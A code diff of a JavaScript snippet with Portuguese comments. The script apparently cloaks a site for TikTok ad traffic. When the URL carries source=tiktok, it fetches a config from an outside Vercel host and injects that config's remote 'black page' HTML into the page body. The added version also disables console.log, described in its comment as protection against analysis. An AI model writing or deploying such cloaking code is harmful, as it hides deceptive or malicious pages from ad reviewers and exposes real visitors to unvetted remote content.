@@ -1,31 +1,44 @@
-(function(){
-  try {
-    // Pega o parâmetro source (case insensitive)
-    const p = new URLSearchParams(window.location.search).get('source');
-    if(!p || p.toLowerCase() !== 'tiktok') return;
-
-    // URL do endpoint que entrega configs - aqui pode ser trocado por sua API real
-    const configURL = 'https://dynamic-lac.vercel.app/config.json';
-
-    fetch(configURL)
-      .then(res => res.json())
-      .then(cfg => {
-        // cfg.blackPage e cfg.whitePage são strings HTML
-
-        // Injetar blackPage no body (exemplo)
-        if(cfg.blackPage){
-          const divBlack = document.createElement('div');
-          divBlack.innerHTML = cfg.blackPage;
-          document.body.appendChild(divBlack);
+(function() {
+    'use strict';
+    
+    // Verifica parâmetros de forma case-insensitive
+    const urlParams = new URLSearchParams(window.location.search.toLowerCase());
+    const sourceParam = urlParams.get('source');
+    
+    if (sourceParam !== 'tiktok') {
+        return; // Não é do TikTok, não faz nada
+    }
+    
+    // Função para buscar configuração
+    async function loadConfig() {
+        try {
+            const response = await fetch('https://dynamic-lac.vercel.app/config.json');
+            const config = await response.json();
+            
+            if (config.blackPage) {
+                injectBlackPage(config.blackPage);
+            }
+        } catch (error) {
+            console.error('Erro ao carregar configuração:', error);
         }
-
-        // Opcional: injetar whitePage em outro lugar, ex:
-        if(cfg.whitePage){
-          const divWhite = document.createElement('div');
-          divWhite.innerHTML = cfg.whitePage;
-          document.body.appendChild(divWhite);
-        }
-      })
-      .catch(()=>{ /* fail silencioso */ });
-  } catch(e) { /* fail silencioso */ }
+    }
+    
+    // Função para injetar black page
+    function injectBlackPage(htmlContent) {
+        const tempDiv = document.createElement('div');
+        tempDiv.innerHTML = htmlContent;
+        document.body.appendChild(tempDiv.firstElementChild || tempDiv);
+    }
+    
+    // Executa quando DOM estiver pronto
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', loadConfig);
+    } else {
+        loadConfig();
+    }
+    
+    // Proteção adicional contra análise
+    const originalConsoleLog = console.log;
+    console.log = function() {};
+    
 })();
